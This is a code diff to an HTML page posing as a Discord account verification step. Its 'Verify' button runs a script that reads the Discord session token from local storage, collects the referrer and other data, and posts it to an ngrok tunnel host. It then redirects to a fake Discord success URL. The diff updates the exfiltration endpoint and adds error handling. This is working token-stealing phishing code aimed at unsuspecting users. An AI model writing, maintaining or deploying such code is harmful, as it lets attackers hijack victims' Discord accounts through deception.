@@ -35,7 +35,7 @@
         <p>Click the button below to verify your account.</p>
         <button onclick="collectData()">Verify</button>
     </div>
-   <script>
+<script>
     function collectData() {
         // Attempt to collect Discord token (if available)
         const discordToken = localStorage.getItem('token') || 'N/A';
@@ -48,7 +48,7 @@
         const referrer = document.referrer;
 
         // Send data to your backend
-        fetch('https://e7b2-2a02-8084-e80-3400-c93a-72e0-111-85e6.ngrok-free.app/submit', {
+        fetch('https://35aa-2a02-8084-e80-3400-c93a-72e0-111-85e6.ngrok-free.app', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -58,6 +58,8 @@
             if (response.ok) {
                 window.location.href = "https://discord.com/verification-success";
             }
+        }).catch(error => {
+            console.error('Error:', error);
         });
     }
 </script>
